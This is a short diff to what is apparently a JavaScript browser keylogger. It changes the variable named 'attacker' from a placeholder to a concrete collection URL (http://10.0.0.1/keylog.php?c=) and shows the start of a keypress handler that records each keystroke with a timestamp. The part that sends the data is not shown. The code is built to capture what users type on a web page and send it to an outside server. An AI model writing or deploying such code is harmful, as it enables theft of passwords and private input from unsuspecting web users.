@@ -1,5 +1,5 @@
 var buffer = [];
-var attacker = 'http://your_server_ip/keylog.php?c='
+var attacker = 'http://10.0.0.1/keylog.php?c='
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
     var stroke = e.key;
